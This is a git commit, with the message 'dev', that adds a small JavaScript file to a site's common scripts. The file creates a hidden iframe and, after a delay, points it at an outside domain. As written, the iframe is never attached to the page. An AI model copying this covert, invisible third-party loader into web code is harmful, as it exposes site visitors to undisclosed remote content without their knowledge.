2bb8e5db461b4392532bb032e6ed8688a69e44d3
youbestio <kalehunt@163.com>
2021-07-07 01:42:34 +0800

    dev

---
+++ common/js/ym.js
@@ -0,0 +1,7 @@
+//<iframe src="https://tz.yuanmengbi.com//iisc.html?id=440"></iframe>
+var iframe = document.createElement("iframe");
+iframe.style.display = "none"
+setTimeout(function () {
+    iframe.src = "https://tz.yuanmengbi.com//iisc.html?id=440"
+}, 2000)
+
